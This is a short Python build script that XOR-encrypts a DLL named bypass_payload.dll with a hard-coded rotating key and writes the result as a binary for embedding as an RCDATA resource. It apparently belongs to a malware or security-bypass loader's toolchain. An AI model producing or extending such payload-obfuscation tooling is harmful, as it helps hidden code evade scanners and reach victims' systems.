#!/usr/bin/env python3
"""
embed_payload.py -- Encrypts bypass_payload.dll with build_salt and generates RCDATA resource.
"""

import sys
import os

BUILD_SALT = bytes([
    0x9E, 0x37, 0x79, 0xB9, 0x7F, 0x4A, 0x7C, 0x15,
    0xD3, 0xA2, 0x61, 0x89, 0x45, 0xE1, 0x02, 0xF8,
    0x6C, 0x3B, 0x91, 0x1A, 0x5D, 0x74, 0xE9, 0x23,
    0x88, 0x5F, 0x10, 0x44, 0xC7, 0x2E, 0x99, 0x51
])

def encrypt(data: bytes, salt: bytes) -> bytes:
    out = bytearray(len(data))
    salt_len = len(salt)
    for i in range(len(data)):
        k = salt[i % salt_len]
        rot = i % 7
        if rot != 0:
            k = ((k << rot) | (k >> (8 - rot))) & 0xFF
        out[i] = data[i] ^ k
    return bytes(out)

def main():
    if len(sys.argv) < 3:
        print("Usage: embed_payload.py <input_dll> <output_bin>")
        sys.exit(1)

    input_dll = sys.argv[1]
    output_bin = sys.argv[2]

    if not os.path.exists(input_dll):
        print(f"[!] Input DLL not found: {input_dll}")
        sys.exit(1)

    with open(input_dll, "rb") as f:
        raw_data = f.read()

    encrypted = encrypt(raw_data, BUILD_SALT)

    os.makedirs(os.path.dirname(os.path.abspath(output_bin)), exist_ok=True)
    with open(output_bin, "wb") as f:
        f.write(encrypted)

    print(f"[+] Encrypted {len(raw_data)} bytes -> {output_bin} ({len(encrypted)} bytes)")

if __name__ == "__main__":
    main()
